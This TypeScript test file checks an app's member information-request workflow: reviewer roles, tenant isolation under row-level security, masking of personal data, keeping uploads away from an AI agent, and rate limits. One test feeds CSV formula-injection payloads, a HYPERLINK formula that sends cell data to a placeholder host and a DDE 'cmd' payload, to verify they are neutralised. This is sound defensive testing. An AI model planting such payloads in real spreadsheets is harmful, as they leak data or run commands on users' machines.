// tests/information-requests.test.ts — W8/P5: member requests ("missing information", example
// records) and the approval queue.
//
// The owner's rules, each asserted here:
//   • any member of the tenant may create a request; only tenant_admin / developer (/ super_admin)
//     may review it;
//   • approving records the decision and NOTHING ELSE — no ontology row, no dataset row;
//   • uploaded records are masked at rest for personal-data columns and fully masked for the
//     uploader's own view; they never reach an AI request or a run before (or after) approval;
//   • strict tenant isolation.
//
// ⛔ EVERY ROUTE CALL RUNS AS `cp_app` (withTenantDbAsRuntimeRoleForTests) — the production role. The
// owner connection bypasses RLS, so a cross-tenant assertion made as the owner would pass in the
// WRONG direction (commonpractice-metering-bypass memory).
import { test, expect, beforeAll, afterAll } from 'bun:test';
import { eq, inArray, sql } from 'drizzle-orm';
import { __setAuthOverridesForTests } from '../src/middleware/auth';
import { Router } from '../src/utils/router';
import { registerInformationRequestRoutes, MAX_PENDING_PER_CHALLENGE, MAX_REQUESTS_PER_DAY } from '../src/routes/information-requests';
import {
  db,
  tenants,
  users,
  challenges,
  informationRequests,
  informationRequestRows,
  chatSessions,
  usageCounters,
  auditLog,
  withTenantDb,
  withTenantDbAsRuntimeRoleForTests,
} from '../src/db/client';
import { loadInjectedDatasets } from '../src/datasets/dataset-service';
import { runAgentChat, ensureChatSession, type AgentEvent } from '../src/ai/agent';
import { __setBrokerDepsForTests } from '../src/host/llm-broker';
import type { LlmProvider, LlmRequest } from '../src/ai/llm/provider';
import type { User } from '../src/types';

// Ids owned by THIS FILE ONLY (tests/fixture-id-collisions.test.ts).
const T = '00000000-0000-0000-0000-00000a8e0001';
const T_OTHER = '00000000-0000-0000-0000-00000a8e0002';
const MEMBER_ID = '00000000-0000-0000-0000-00000a8e0011';
const MEMBER2_ID = '00000000-0000-0000-0000-00000a8e0012';
const DEV_ID = '00000000-0000-0000-0000-00000a8e0013';
const ADMIN_ID = '00000000-0000-0000-0000-00000a8e0014';
const OUTSIDER_ID = '00000000-0000-0000-0000-00000a8e0015';
const OTHER_ADMIN_ID = '00000000-0000-0000-0000-00000a8e0016';
// Extra members so each test's requests stay under the per-member limits (MAX_PENDING_PER_CHALLENGE
// = 5) without the tests depending on one another's counts.
const MEMBER3_ID = '00000000-0000-0000-0000-00000a8e0017';
const MEMBER4_ID = '00000000-0000-0000-0000-00000a8e0018';
const MEMBER5_ID = '00000000-0000-0000-0000-00000a8e0019';
const MEMBER6_ID = '00000000-0000-0000-0000-00000a8e001a';
const CH_ID = '00000000-0000-0000-0000-00000a8e0021';
const CH_OTHER = '00000000-0000-0000-0000-00000a8e0022';

const member: User = { id: MEMBER_ID, email: 'w8p5-m@test', name: 'W8 Member', roles: ['member'], tenantId: T };
const member2: User = { id: MEMBER2_ID, email: 'w8p5-m2@test', name: 'W8 Member Two', roles: ['member'], tenantId: T };
const dev: User = { id: DEV_ID, email: 'w8p5-d@test', name: 'W8 Dev', roles: ['developer'], tenantId: T };
const admin: User = { id: ADMIN_ID, email: 'w8p5-a@test', name: 'W8 Admin', roles: ['tenant_admin'], tenantId: T };
const member3: User = { id: MEMBER3_ID, email: 'w8p5-m3@test', name: 'W8 Member Three', roles: ['member'], tenantId: T };
const member4: User = { id: MEMBER4_ID, email: 'w8p5-m4@test', name: 'W8 Member Four', roles: ['member'], tenantId: T };
const member5: User = { id: MEMBER5_ID, email: 'w8p5-m5@test', name: 'W8 Member Five', roles: ['member'], tenantId: T };
const member6: User = { id: MEMBER6_ID, email: 'w8p5-m6@test', name: 'W8 Member Six', roles: ['member'], tenantId: T };
const outsider: User = { id: OUTSIDER_ID, email: 'w8p5-o@test', name: 'W8 Outsider', roles: ['member'], tenantId: T_OTHER };
const otherAdmin: User = { id: OTHER_ADMIN_ID, email: 'w8p5-oa@test', name: 'W8 Other Admin', roles: ['tenant_admin'], tenantId: T_OTHER };

// Example records: `email` is a personal-data column by the dataset name heuristic.
const MARK_AMOUNT = '913377';
const MARK_EMAIL = 'kees.p5secret@x.invalid';
const MARK_NOTE = 'P5-note-Zuiderzee';
const CSV = `email,amount,remark\n${MARK_EMAIL},${MARK_AMOUNT},${MARK_NOTE}\nother@x.invalid,12,plain\n`;

const router = new Router();
registerInformationRequestRoutes(router);

function as(u: User) {
  __setAuthOverridesForTests({ validateAuth: async () => u, requireRole: async () => u });
}

async function call(tenant: string, method: string, path: string, body?: unknown | FormData) {
  const matched = router.match(method, path.split('?')[0]!);
  if (!matched) throw new Error(`no route for ${method} ${path}`);
  return withTenantDbAsRuntimeRoleForTests(tenant, async () => {
    const isForm = body instanceof FormData;
    const req = new Request(`http://localhost${path}`, {
      method,
      headers: body !== undefined && !isForm ? { 'content-type': 'application/json' } : {},
      body: body === undefined ? undefined : isForm ? body : JSON.stringify(body),
    });
    const res = await matched.handler(req, ...matched.params);
    const text = await res.text();
    return { status: res.status, json: text ? JSON.parse(text) : null };
  });
}

function csvForm(csv = CSV, name = 'Example claims'): FormData {
  const f = new FormData();
  f.append('file', new File([csv], 'claims.csv', { type: 'text/csv' }));
  f.append('name', name);
  return f;
}

const ALL_USERS = [MEMBER_ID, MEMBER2_ID, DEV_ID, ADMIN_ID, OUTSIDER_ID, OTHER_ADMIN_ID, MEMBER3_ID, MEMBER4_ID, MEMBER5_ID, MEMBER6_ID];

async function cleanup() {
  await db.delete(chatSessions).where(inArray(chatSessions.user_id, ALL_USERS));
  await db.delete(usageCounters).where(inArray(usageCounters.user_id, ALL_USERS));
  await db.delete(auditLog).where(inArray(auditLog.actor_id, ALL_USERS));
  await db.delete(informationRequests).where(inArray(informationRequests.tenant_id, [T, T_OTHER]));
  await db.delete(challenges).where(inArray(challenges.id, [CH_ID, CH_OTHER]));
  await db.delete(users).where(inArray(users.id, ALL_USERS));
  await db.delete(tenants).where(inArray(tenants.id, [T, T_OTHER]));
}

beforeAll(async () => {
  await cleanup();
  await db.insert(tenants).values([
    { id: T, name: 'W8 Requests', slug: 'w8-requests' },
    { id: T_OTHER, name: 'W8 Requests Other', slug: 'w8-requests-other' },
  ]);
  await db.insert(users).values([
    { id: MEMBER_ID, email: member.email, name: member.name, tenant_id: T },
    { id: MEMBER2_ID, email: member2.email, name: member2.name, tenant_id: T },
    { id: DEV_ID, email: dev.email, name: dev.name, tenant_id: T, tenant_role: 'developer' },
    { id: ADMIN_ID, email: admin.email, name: admin.name, tenant_id: T, tenant_role: 'tenant_admin' },
    ...[member3, member4, member5, member6].map((u) => ({ id: u.id, email: u.email, name: u.name, tenant_id: T })),
    { id: OUTSIDER_ID, email: outsider.email, name: outsider.name, tenant_id: T_OTHER },
    { id: OTHER_ADMIN_ID, email: otherAdmin.email, name: otherAdmin.name, tenant_id: T_OTHER, tenant_role: 'tenant_admin' },
  ]);
  await db.insert(challenges).values([
    { id: CH_ID, tenant_id: T, title: 'W8 requests challenge', description: 'x', work_area: 'Claims', submitter_id: MEMBER2_ID, status: 'voting', week: '2026-W42' },
    { id: CH_OTHER, tenant_id: T_OTHER, title: 'W8 other challenge', description: 'x', work_area: 'Claims', submitter_id: OUTSIDER_ID, status: 'voting', week: '2026-W42' },
  ]);
}, 30_000);

afterAll(async () => {
  __setBrokerDepsForTests(undefined);
  __setAuthOverridesForTests(undefined);
  await cleanup();
}, 30_000);

const writeCounts = async () =>
  (await db.execute(sql`select
    (select count(*) from ontology_entities)::int as entities,
    (select count(*) from ontology_attributes)::int as attributes,
    (select count(*) from datasets)::int as datasets,
    (select count(*) from dataset_rows)::int as dataset_rows,
    (select count(*) from dataset_mappings)::int as mappings`)) as unknown as Record<string, number>[];

async function newMissing(u: User = member, name = 'Policy holder') {
  as(u);
  return call(T, 'POST', `/api/challenges/${CH_ID}/information-requests`, {
    name,
    description: 'Who owns the policy',
    fieldNames: ['policy number', 'start date', 'policy number'],
  });
}

test('the fixture runs under RLS — the other tenant cannot see this tenant\'s challenge as cp_app', async () => {
  const seen = await withTenantDbAsRuntimeRoleForTests(T_OTHER, async () =>
    db.select({ id: challenges.id }).from(challenges).where(eq(challenges.id, CH_ID)),
  );
  expect(seen).toEqual([]);
});

test('P5: a member creates a "missing information" request — pending, theirs, nothing else written', async () => {
  const before = await writeCounts();
  const r = await newMissing();
  expect(r.status).toBe(201);
  expect(r.json).toMatchObject({ kind: 'missing_information', status: 'pending', name: 'Policy holder', fieldNames: ['policy number', 'start date'], mine: true });
  const [row] = await db.select().from(informationRequests).where(eq(informationRequests.id, r.json.id));
  expect([row!.tenant_id, row!.created_by, row!.reviewed_at]).toEqual([T, MEMBER_ID, null]);
  expect(await writeCounts()).toEqual(before);
});

test('P5: a member uploads example records — personal data masked AT REST, the uploader sees every value masked', async () => {
  const before = await writeCounts();
  as(member);
  const up = await call(T, 'POST', `/api/challenges/${CH_ID}/information-requests/upload`, csvForm());
  expect(up.status).toBe(201);
  expect(up.json).toMatchObject({ kind: 'example_records', status: 'pending', name: 'Example claims', rowCount: 2, fileName: 'claims.csv' });
  expect(up.json.columns.map((c: { name: string }) => c.name)).toEqual(['email', 'amount', 'remark']);
  // At rest: the email column is redacted; the other values are kept for the approver.
  const stored = await db.select().from(informationRequestRows).where(eq(informationRequestRows.request_id, up.json.id));
  const wire = JSON.stringify(stored.map((s) => s.data));
  expect(wire).not.toContain(MARK_EMAIL);
  expect(wire).toContain(MARK_AMOUNT);
  // No dataset, no ontology row came out of it.
  expect(await writeCounts()).toEqual(before);
  // The uploader's own view: names, and no value at all.
  const mine = await call(T, 'GET', `/api/information-requests/${up.json.id}`);
  expect(mine.status).toBe(200);
  expect(mine.json.masked).toBe(true);
  expect(mine.json.rows).toHaveLength(2);
  const seen = JSON.stringify(mine.json.rows);
  for (const v of [MARK_AMOUNT, MARK_NOTE, MARK_EMAIL]) expect(seen).not.toContain(v);
  // An approver sees the stored values (personal data still redacted).
  as(dev);
  const rev = await call(T, 'GET', `/api/information-requests/${up.json.id}`);
  expect(rev.json.masked).toBe(false);
  expect(JSON.stringify(rev.json.rows)).toContain(MARK_AMOUNT);
  expect(JSON.stringify(rev.json.rows)).not.toContain(MARK_EMAIL);
});

test('P5: personal VALUES are masked at rest too — a BSN in a column called "klant", a phone number inside notes', async () => {
  // None of these column names trips the name heuristic: `klant`, `notities`, `rekening`, `plaats`.
  // Only the date of birth sits in a column whose NAME says so (`geboortedatum`).
  const csv = [
    'klant,notities,rekening,plaats,geboortedatum,bedrag',
    '111222333,"Bel mevrouw op 06-12345678 na 17u, of mail j.bakker@voorbeeld.nl",NL91 ABNA 0417 1643 00,"Dorpsstraat 4, 1012 AB Amsterdam",1985-03-12,450',
    '123456782,"Called +44 20 7946 0958 about the claim",GB82WEST12345698765432,Utrecht,12-07-1990,1200',
  ].join('\n');
  as(member3);
  const up = await call(T, 'POST', `/api/challenges/${CH_ID}/information-requests/upload`, csvForm(csv, 'Klantgegevens'));
  expect(up.status).toBe(201);
  const stored = (
    await db.select().from(informationRequestRows).where(eq(informationRequestRows.request_id, up.json.id)).orderBy(informationRequestRows.idx)
  ).map((r) => r.data as Record<string, unknown>);
  const wire = JSON.stringify(stored);
  for (const raw of ['111222333', '123456782', '06-12345678', 'j.bakker@voorbeeld.nl', 'NL91', 'GB82', '1012 AB', '1985-03-12', '12-07-1990', '7946']) {
    expect(wire).not.toContain(raw);
  }
  // The match is replaced, the rest of the text is kept — the approver can still read the note.
  expect(stored[0]!.notities).toBe('Bel mevrouw op [redacted] na 17u, of mail [redacted]');
  expect(stored[0]!.plaats).toBe('Dorpsstraat 4, [redacted] Amsterdam');
  expect(stored[1]!.notities).toBe('Called [redacted] about the claim');
  expect(stored[0]!.klant).toBe('[redacted]');
  // Values that are not personal data survive (positive control): amounts, a bare city.
  expect(stored.map((r) => r.bedrag)).toEqual([450, 1200]);
  expect(stored[1]!.plaats).toBe('Utrecht');
});

test('P5: a cell that would start a spreadsheet formula is stored inert (leading \') — text only, numbers untouched', async () => {
  const csv = [
    'omschrijving,link,bedrag,code',
    '=HYPERLINK("https://x.invalid/?"&A1;"Open"),"=cmd|\' /C calc\'!A0",-5,@SUM(A1)',
    '+31 is geen nummer hier,gewoon tekst,12,"-2+3"',
  ].join('\n');
  as(member3);
  const up = await call(T, 'POST', `/api/challenges/${CH_ID}/information-requests/upload`, csvForm(csv, 'Formules'));
  expect(up.status).toBe(201);
  const stored = (
    await db.select().from(informationRequestRows).where(eq(informationRequestRows.request_id, up.json.id)).orderBy(informationRequestRows.idx)
  ).map((r) => r.data as Record<string, unknown>);
  expect(stored[0]!.omschrijving).toBe(`'=HYPERLINK("https://x.invalid/?"&A1;"Open")`);
  expect(stored[0]!.link).toBe(`'=cmd|' /C calc'!A0`);
  expect(stored[0]!.code).toBe(`'@SUM(A1)`);
  expect(stored[1]!.omschrijving).toBe(`'+31 is geen nummer hier`);
  expect(stored[1]!.code).toBe(`'-2+3`);
  // A typed number is not text and not a formula; ordinary text is untouched.
  expect(stored.map((r) => r.bedrag)).toEqual([-5, 12]);
  expect(stored[1]!.link).toBe('gewoon tekst');
});

test('P5: an upload must be CSV or Excel', async () => {
  as(member);
  const f = new FormData();
  f.append('file', new File(['{"a":1}'], 'x.json', { type: 'application/json' }));
  const r = await call(T, 'POST', `/api/challenges/${CH_ID}/information-requests/upload`, f);
  expect(r.status).toBe(400);
  expect(r.json.error).toBe('unsupported_file_type');
});

test('P5: members see only their own requests on the challenge; a reviewer sees all', async () => {
  await newMissing(member, 'Mine A');
  await newMissing(member2, 'Theirs B');
  as(member);
  const m1 = await call(T, 'GET', `/api/challenges/${CH_ID}/information-requests`);
  expect(m1.json.canReview).toBe(false);
  const names = m1.json.items.map((i: { name: string }) => i.name);
  expect(names).toContain('Mine A');
  expect(names).not.toContain('Theirs B');
  as(member2);
  const other = await call(T, 'GET', `/api/information-requests/${m1.json.items[0].id}`);
  expect(other.status).toBe(404);
  as(admin);
  const all = await call(T, 'GET', `/api/challenges/${CH_ID}/information-requests`);
  expect(all.json.canReview).toBe(true);
  expect(all.json.items.map((i: { name: string }) => i.name)).toEqual(expect.arrayContaining(['Mine A', 'Theirs B']));
});

test('⛔ P5: a member cannot approve, reject, list the queue or read the records (403, nothing changes)', async () => {
  const r = await newMissing();
  as(member);
  for (const [method, path, body] of [
    ['POST', `/api/information-requests/${r.json.id}/approve`, {}],
    ['POST', `/api/information-requests/${r.json.id}/reject`, { note: 'no' }],
    ['GET', '/api/information-requests', undefined],
    ['GET', `/api/information-requests/${r.json.id}/records`, undefined],
  ] as const) {
    const res = await call(T, method, path, body);
    expect(res.status, `${method} ${path}`).toBe(403);
  }
  const [row] = await db.select().from(informationRequests).where(eq(informationRequests.id, r.json.id));
  expect([row!.status, row!.reviewed_by]).toEqual(['pending', null]);
});

test('⛔ P5: a developer approves — only the decision is written; the answer points at the existing create screen', async () => {
  const r = await newMissing(member3, 'Approve me');
  const before = await writeCounts();
  as(dev);
  const ok = await call(T, 'POST', `/api/information-requests/${r.json.id}/approve`, { note: 'Good idea' });
  expect(ok.status).toBe(200);
  expect(ok.json.item).toMatchObject({ status: 'approved', reviewNote: 'Good idea' });
  expect(ok.json.next).toEqual({ href: `/ontology?fromRequest=${r.json.id}` });
  expect(await writeCounts()).toEqual(before);
  const [row] = await db.select().from(informationRequests).where(eq(informationRequests.id, r.json.id));
  expect([row!.status, row!.reviewed_by]).toEqual(['approved', DEV_ID]);
  // Decided once: a second decision is refused.
  as(admin);
  const again = await call(T, 'POST', `/api/information-requests/${r.json.id}/reject`, { note: 'late' });
  expect(again.status).toBe(409);
  expect(again.json.error).toBe('request_not_pending');
});

test('⛔ P5: a tenant_admin approves an upload — no dataset is created; records are read for the dataset screen', async () => {
  as(member3);
  const up = await call(T, 'POST', `/api/challenges/${CH_ID}/information-requests/upload`, csvForm(CSV, 'Upload to approve'));
  const before = await writeCounts();
  as(admin);
  const ok = await call(T, 'POST', `/api/information-requests/${up.json.id}/approve`, {});
  expect(ok.status).toBe(200);
  expect(ok.json.next).toEqual({ href: `/datasets?fromRequest=${up.json.id}` });
  expect(await writeCounts()).toEqual(before);
  const rec = await call(T, 'GET', `/api/information-requests/${up.json.id}/records`);
  expect(rec.status).toBe(200);
  expect(rec.json.name).toBe('Upload to approve');
  expect(rec.json.rows).toHaveLength(2);
});

test('P5: rejecting needs a note, and the member reads it on the challenge', async () => {
  const r = await newMissing(member4, 'Reject me');
  as(admin);
  const bare = await call(T, 'POST', `/api/information-requests/${r.json.id}/reject`, {});
  expect(bare.status).toBeGreaterThanOrEqual(400);
  const ok = await call(T, 'POST', `/api/information-requests/${r.json.id}/reject`, { note: 'We already have this' });
  expect(ok.status).toBe(200);
  as(member4);
  const list = await call(T, 'GET', `/api/challenges/${CH_ID}/information-requests`);
  const mine = list.json.items.find((i: { id: string }) => i.id === r.json.id);
  expect(mine).toMatchObject({ status: 'rejected', reviewNote: 'We already have this' });
});

test('P5: the queue lists this tenant\'s pending requests with the count', async () => {
  as(dev);
  const q = await call(T, 'GET', '/api/information-requests?status=pending');
  expect(q.status).toBe(200);
  expect(q.json.items.every((i: { status: string }) => i.status === 'pending')).toBe(true);
  expect(q.json.pendingCount).toBe(q.json.items.length);
  expect(q.json.items.length).toBeGreaterThan(0);
  expect(q.json.items[0].challengeTitle).toBe('W8 requests challenge');
});

test('⛔ P5: cross-tenant — another tenant can neither create on, read, list nor decide this tenant\'s requests (cp_app)', async () => {
  const r = await newMissing(member4, 'Isolated');
  as(outsider);
  expect((await call(T_OTHER, 'POST', `/api/challenges/${CH_ID}/information-requests`, { name: 'x' })).status).toBe(404);
  expect((await call(T_OTHER, 'GET', `/api/information-requests/${r.json.id}`)).status).toBe(404);
  as(otherAdmin);
  expect((await call(T_OTHER, 'POST', `/api/information-requests/${r.json.id}/approve`, {})).status).toBe(404);
  const q = await call(T_OTHER, 'GET', '/api/information-requests?status=all');
  expect(q.json.items.map((i: { id: string }) => i.id)).not.toContain(r.json.id);
  // RLS itself: rows and records are invisible to the other tenant's runtime role.
  const seen = await withTenantDbAsRuntimeRoleForTests(T_OTHER, async () => ({
    req: await db.select().from(informationRequests).where(eq(informationRequests.tenant_id, T)),
    rows: await db.select().from(informationRequestRows).where(eq(informationRequestRows.tenant_id, T)),
  }));
  expect(seen).toEqual({ req: [], rows: [] });
  // …and refuses a row written into this tenant from the other tenant's scope.
  let err: unknown;
  try {
    await withTenantDbAsRuntimeRoleForTests(T_OTHER, async () =>
      db.insert(informationRequests).values({ tenant_id: T, challenge_id: CH_ID, kind: 'missing_information', name: 'smuggled' }),
    );
  } catch (e) {
    err = e;
  }
  expect(String((err as { cause?: unknown })?.cause ?? err)).toContain('row-level security');
});

test('⛔ P5: uploaded records never reach an AI request or a run — before or after approval', async () => {
  as(member4);
  const up = await call(T, 'POST', `/api/challenges/${CH_ID}/information-requests/upload`, csvForm(CSV, 'Never to AI'));
  expect(up.status).toBe(201);

  async function probe(): Promise<string> {
    // The build agent, asked about data: it lists the workspace's datasets and describes the
    // request by every name a client could know it by.
    const requests: LlmRequest[] = [];
    let turn = 0;
    const provider = {
      chat: async (req: LlmRequest) => {
        requests.push(JSON.parse(JSON.stringify(req)));
        turn++;
        if (turn === 1) {
          return {
            toolCalls: [
              { id: 'a', name: 'list_datasets', input: {} },
              { id: 'b', name: 'describe_data', input: { slug: up.json.id } },
              { id: 'c', name: 'describe_data', input: { slug: 'Never to AI' } },
            ],
            usage: { tokensIn: 1, tokensOut: 1 },
          };
        }
        return { text: 'done', usage: { tokensIn: 1, tokensOut: 1 } };
      },
    } as LlmProvider;
    __setBrokerDepsForTests({ chatProvider: provider, limits: () => ({ dailyLlmCap: 100, weeklySpendUsd: 100 }) });
    const events: AgentEvent[] = [];
    const sessionId = await withTenantDb(T, () => ensureChatSession(MEMBER_ID, null));
    await withTenantDb(T, () =>
      runAgentChat({
        userId: MEMBER_ID, roles: ['member'], tenantId: T, sessionId, flowId: null, challengeId: CH_ID,
        userMessage: 'What example data do we have?', emit: (e) => events.push(e), signal: new AbortController().signal,
      }),
    );
    expect(events.some((e) => e.type === 'tool-result' && e.name === 'list_datasets' && e.ok)).toBe(true);
    // The run path injects by dataset slug from `datasets` only — a request is not one.
    const injected = await withTenantDb(T, () => loadInjectedDatasets(T, [up.json.id, 'Never to AI', 'claims'], false));
    expect(injected.datasets).toEqual({});
    return JSON.stringify(requests.map((r) => r.messages));
  }

  const before = await probe();
  for (const v of [MARK_AMOUNT, MARK_NOTE, MARK_EMAIL]) expect(before).not.toContain(v);
  as(admin);
  expect((await call(T, 'POST', `/api/information-requests/${up.json.id}/approve`, {})).status).toBe(200);
  const after = await probe();
  for (const v of [MARK_AMOUNT, MARK_NOTE, MARK_EMAIL]) expect(after).not.toContain(v);
});

// ---- upload abuse limits (2026-10-15) ----

const countOf = async (u: User) =>
  (await db.select({ id: informationRequests.id }).from(informationRequests).where(eq(informationRequests.created_by, u.id))).length;

test('limits: a member may hold at most 5 OPEN requests per challenge — the 6th (request or upload) is a 429, nothing written', async () => {
  expect(MAX_PENDING_PER_CHALLENGE).toBe(5);
  for (let i = 0; i < MAX_PENDING_PER_CHALLENGE; i++) {
    expect((await newMissing(member5, `Open ${i}`)).status).toBe(201);
  }
  const over = await newMissing(member5, 'One too many');
  expect(over.status).toBe(429);
  expect(over.json).toMatchObject({ error: 'information_request_limit', details: { reason: 'pending', limit: 5 } });
  as(member5);
  const up = await call(T, 'POST', `/api/challenges/${CH_ID}/information-requests/upload`, csvForm(CSV, 'Over the limit'));
  expect(up.status).toBe(429);
  expect(up.json.details.reason).toBe('pending');
  expect(await countOf(member5)).toBe(MAX_PENDING_PER_CHALLENGE);

  // Once a reviewer decides one, the member may ask again.
  const [first] = await db.select({ id: informationRequests.id }).from(informationRequests).where(eq(informationRequests.created_by, MEMBER5_ID)).limit(1);
  as(admin);
  expect((await call(T, 'POST', `/api/information-requests/${first!.id}/approve`, {})).status).toBe(200);
  expect((await newMissing(member5, 'After a decision')).status).toBe(201);
});

test('limits: the in-transaction re-check takes the per-user advisory lock, so concurrent requests serialize', async () => {
  // member5 is at 5 open after the test above. Free one slot.
  const [one] = await db
    .select({ id: informationRequests.id })
    .from(informationRequests)
    .where(sql`${informationRequests.created_by} = ${MEMBER5_ID} and ${informationRequests.status} = 'pending'`)
    .limit(1);
  await db
    .update(informationRequests)
    .set({ status: 'rejected', review_note: 'x', reviewed_at: new Date(), reviewed_by: ADMIN_ID })
    .where(eq(informationRequests.id, one!.id));
  // Hold the same lock from another session: the request must WAIT for it (a count taken without
  // the lock is what lets two concurrent requests both see 4 and land a 6th).
  let settled = false;
  let pendingCall: Promise<{ status: number }> | undefined;
  await db.transaction(async (tx) => {
    await tx.execute(sql`select pg_advisory_xact_lock(hashtextextended(${'information_request:' + MEMBER5_ID}, 0))`);
    pendingCall = newMissing(member5, 'Waits for the lock').then((r) => {
      settled = true;
      return r;
    });
    await new Promise((r) => setTimeout(r, 400));
    expect(settled).toBe(false);
  });
  expect((await pendingCall!).status).toBe(201);
  // …and the slot is now taken: the next one is refused.
  expect((await newMissing(member5, 'Over again')).status).toBe(429);
});

test('limits: at most 20 requests per member in 24 hours, across challenges — the next is a 429 (reason daily)', async () => {
  expect(MAX_REQUESTS_PER_DAY).toBe(20);
  // 20 requests made earlier today, all already decided (so the open-request limit is not what bites).
  await db.insert(informationRequests).values(
    Array.from({ length: MAX_REQUESTS_PER_DAY }, (_, i) => ({
      tenant_id: T, challenge_id: CH_ID, kind: 'missing_information' as const, name: `Earlier ${i}`,
      created_by: MEMBER6_ID, status: 'approved' as const, reviewed_at: new Date(), reviewed_by: ADMIN_ID,
    })),
  );
  const over = await newMissing(member6, 'Twenty-first');
  expect(over.status).toBe(429);
  expect(over.json).toMatchObject({ error: 'information_request_limit', details: { reason: 'daily', limit: 20 } });
  // Requests older than 24 hours do not count.
  await db.execute(sql`update information_requests set created_at = now() - interval '25 hours' where created_by = ${MEMBER6_ID}`);
  expect((await newMissing(member6, 'Next day')).status).toBe(201);
});

test('limits: a reviewer is not limited (admins keep control of the queue)', async () => {
  for (let i = 0; i <= MAX_PENDING_PER_CHALLENGE; i++) {
    expect((await newMissing(dev, `Dev ${i}`)).status).toBe(201);
  }
});
